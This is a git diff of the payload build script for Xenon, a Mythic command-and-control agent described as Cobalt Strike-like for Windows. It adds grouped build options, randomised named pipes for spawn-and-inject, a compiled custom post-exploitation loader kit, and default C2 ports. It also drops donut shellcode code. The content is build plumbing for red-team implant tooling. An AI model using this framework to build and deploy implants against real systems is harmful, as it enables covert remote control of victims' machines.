@@ -6,8 +6,6 @@ from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
 from distutils.dir_util import copy_tree
 import asyncio, tempfile
-from .utils.agent_global_settings import PROCESS_INJECT_KIT
-import donut
 from ..utils.packer import serialize_int, serialize_bool, serialize_string, generate_raw_c2_transform_definitions
 
 
@@ -18,7 +16,7 @@ class XenonAgent(PayloadType):
     supported_os = [SupportedOS.Windows]
     wrapper = False
     wrapped_payloads = []
-    note = """A Cobalt Strike-like agent for Windows targets. Version: v0.0.4"""
+    note = """A Cobalt Strike-like agent for Windows targets. Version: v0.0.5"""
     supports_dynamic_loading = True
     c2_profiles = ["httpx", "smb", "tcp"]
     mythic_encrypts = True
@@ -27,31 +25,37 @@ class XenonAgent(PayloadType):
         BuildParameter(
             name = "debug",
             parameter_type=BuildParameterType.Boolean,
+            group_name="Output",
             default_value="false",
             description="Debug: Enable debugging console and symbols in payload."
         ),
         BuildParameter(
             name = "output_type",
             parameter_type=BuildParameterType.ChooseOne,
+            group_name="Output",
             choices=[ "exe", "dll", "shellcode"],
             default_value="exe",
-            description="Output type: shellcode, dynamic link library, executable"
+            description="Output type: shellcode, dynamic link library, executable",
         ),
         BuildParameter(
             name = "default_pipename",
             parameter_type=BuildParameterType.String,
-            default_value="xenon",
-            description="Default Pipe Name: Value of the named pipe to use for spawn & inject commands. (e.g., execute_assembly)"
+            group_name="Spawn",
+            format_string="[a-z0-9]{8}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{12}",
+            randomize=True,
+            description="Default string to use as named pipe output for spawn & inject commands. (e.g., execute_assembly, inject_shellcode)"
         ),
         BuildParameter(
             name = "spawnto_process",
             parameter_type=BuildParameterType.String,
+            group_name="Spawn",
             default_value="svchost.exe",
             description="Spawnto Process: Process name to use for spawn & inject commands. Must be in C:\\Windows\\System32\\"
         ),
         BuildParameter(
             name = "dll_export_function",
             parameter_type=BuildParameterType.String,
+            group_name="DLL",
             default_value="DllRegisterServer",
             description="Dll Export Function: Used for Dll execution with rundll32. (e.g., rundll32.exe xenon.dll,DllRegisterServer)",
             hide_conditions=[
@@ -62,7 +66,8 @@ class XenonAgent(PayloadType):
             name = "custom_udrl",
             parameter_type=BuildParameterType.Boolean,
             default_value="false",
-            description="User-Defined Reflective Loader: Define your own RDL for agent execution. Must be based on Crystal Palace - See docs for details.",
+            description="User-Defined Reflective Loader: To load Agent DLL. Must be based on Crystal Palace - See docs for details.",
+            group_name="Shellcode",
             hide_conditions=[
                 HideCondition(name="output_type", operand=HideConditionOperand.NotEQ, value="shellcode")
             ]
@@ -70,10 +75,26 @@ class XenonAgent(PayloadType):
         BuildParameter(
             name = "udrl_file",
             parameter_type=BuildParameterType.File,
-            # default_value="xenon",
             description="Crystal UDRL: ZIP or TAR must follow specified format - See docs for details.",
+            group_name="Shellcode",
             hide_conditions=[
                 HideCondition(name="custom_udrl", operand=HideConditionOperand.NotEQ, value=True)
+            ]
+        ),
+        BuildParameter(
+            name = "custom_postex_udrl",
+            parameter_type=BuildParameterType.Boolean,
+            default_value="false",
+            description="User-Defined Reflective Loader: Define your own RDL for agent execution. Must be based on Crystal Palace - See docs for details.",
+            group_name="Post-Ex"
+        ),
+        BuildParameter(
+            name = "postex_udrl_file",
+            parameter_type=BuildParameterType.File,
+            description="Custom Post-Ex DLL Kit: ZIP or TAR must follow specified format - See docs for details.",
+            group_name="Post-Ex",
+            hide_conditions=[
+                HideCondition(name="custom_postex_udrl", operand=HideConditionOperand.NotEQ, value=True)
             ]
         )
     ]
@@ -84,7 +105,7 @@ class XenonAgent(PayloadType):
     
     build_steps = [
         BuildStep(step_name="Gathering Files", step_description="Making sure all commands have backing files on disk"),
-        BuildStep(step_name="Configuring", step_description="Stamping in configuration values"),
+        BuildStep(step_name="Configuring Post-Ex", step_description="Configuring Post-Ex DLL Kit"),
         BuildStep(step_name="Installing Modules", step_description="Compile and include necessary BOFs"),
         BuildStep(step_name="Compiling", step_description="Compiling with Mingw-w64")
 
@@ -224,12 +245,53 @@ class XenonAgent(PayloadType):
         else:
             logging.info(f"[stdout]: {stdout.decode()}")
         
-    
+        #######################################
+        ### Write Postex Kit to disk       ####
+        #######################################
+        if self.get_parameter('custom_postex_udrl') == True:
+            # Make per-payload custom dir to avoid overwriting other builds
+            custom_postex_path = os.path.join(self.agent_code_path, "Loader", "postex_" + self.uuid)
+            zip_path = os.path.join(custom_postex_path, "loader-postex.zip")
+            os.makedirs(custom_postex_path, exist_ok=True)
+            # Get file
+            custom_postex_file_id = self.get_parameter('postex_udrl_file')
+            custom_postex_contents = await SendMythicRPCFileGetContent(
+                MythicRPCFileGetContentMessage(AgentFileId=custom_postex_file_id)
+            )
+            # Write to disk
+            with open(zip_path, "wb") as f:
+                f.seek(0)
+                f.write(custom_postex_contents.Content)
+                f.truncate()
+            # Unzip
+            with zipfile.ZipFile(zip_path, 'r') as z:
+                z.extractall(custom_postex_path)
+
+            # Compile Postex Kit (must be based on Crystal Palace)
+            command = "make"
+            proc = await asyncio.create_subprocess_shell(
+                command, 
+                stdout=asyncio.subprocess.PIPE, 
+                stderr=asyncio.subprocess.PIPE, 
+                cwd=custom_postex_path
+            )
+            stdout, stderr = await proc.communicate()
+            if proc.returncode != 0:
+                build_success = False
+                logging.error(f"Command failed with exit code {proc.returncode}")
+                logging.error(f"[stderr]: {stderr.decode()}")
+                raise Exception("make failed")
+            else:
+                logging.info(f"[stdout]: {stdout.decode()}")
+            # Clean up zip file
+            os.remove(zip_path)
+
+
         # Notify: Installed Modules
         await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
-                StepName="Installing Modules",
-                StepStdout="Installed needed BOF files",
+                StepName="Configuring Post-Ex",
+                StepStdout="Configured Post-Ex",
                 StepSuccess=True
         ))
 
@@ -301,9 +363,16 @@ class XenonAgent(PayloadType):
                     else:
                         raise ValueError("Invalid URL scheme")
 
-                    # Split hostname and port
-                    hostname, port = url_without_scheme.split(':')
-                    port = int(port)
+                    # Check if port was supplied, if not use defaults (http:80, https:443)
+                    if ':' in url_without_scheme:
+                        hostname, port = url_without_scheme.split(':')
+                        port = int(port)
+                    else:
+                        hostname = url_without_scheme
+                        if ssl:
+                            port = 443
+                        else:
+                            port = 80
 
                     # Serialize hostname, port, and SSL flag
                     serialized_data += serialize_string(hostname)
@@ -571,17 +640,11 @@ class XenonAgent(PayloadType):
 
                     logging.info(f"[+] Linker converted DLL to PIC written to {bin_file}")
                 
-                
-                # bin_file = f"{agent_build_path.name}/loader.bin"
-                # # Use donut-shellcode here
-                # export_function = self.get_parameter('dll_export_function')
-                # donut.create(file=output_path, output=bin_file, arch=3, bypass=1, method=export_function)
-   
                 if os.path.exists(bin_file):
                     # Shellcode is new output file path
                     output_path = bin_file
                 else:
-                    # Some error occurred with donut
+                    # Some error occurred with CPL
                     stdout_err += f'[stderr]\nFile not found {bin_file}'
                     build_success = False
 
